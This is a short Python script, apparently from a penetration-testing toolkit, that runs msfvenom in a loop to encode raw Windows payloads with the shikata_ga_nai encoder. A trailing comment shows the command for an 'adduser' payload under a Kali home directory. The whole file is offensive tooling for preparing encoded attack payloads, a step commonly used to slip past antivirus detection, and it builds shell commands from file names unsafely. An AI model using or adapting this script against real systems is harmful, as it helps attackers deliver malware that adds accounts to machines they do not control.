#!/bin/python
print("[#]AUTO_MSFVENOM[#]")

import os

# vars
prefix = "    windows/"
payload_list_file = "payload_list.txt"
payloads_selected = []
payloads_dir = "./payloads"
output_dir = "./payloads_encoded"


if (not os.path.exists(payloads_dir)):
    print("payload dir was not found, please run create_payloads.py first...")
    exit(1)

print("running msfvenom in loop and encoding the payloads...")

if (not os.path.exists(output_dir)):
    os.mkdir(output_dir)

encoder = 'x86/shikata_ga_nai'
for filename in os.listdir(payloads_dir):
    path_payload = os.path.join(payloads_dir, filename)
    # checking if it is a file
    if os.path.isfile(path_payload):
        path_payload_encoded = os.path.join(output_dir, filename+'.encoded')
        arch = 'x86'
        if '64' in filename:
            arch = "x64"
        cmd = "msfvenom --payload - --platform windows --arch {} -e {} -f raw -o {} < {}".format(arch, encoder, path_payload_encoded, path_payload)
        os.system(cmd)

print('bye')




# msfvenom --payload - --platform windows --arch x86 -e x86/shikata_ga_nai -f raw -o /home/kali/Desktop/windows_adduser.bin.encoded < /home/kali/Desktop/windows_adduser.bin
# '/home/kali/Desktop/windows_adduser.bin.encoded'
# '/home/kali/Desktop/windows_adduser.bin'
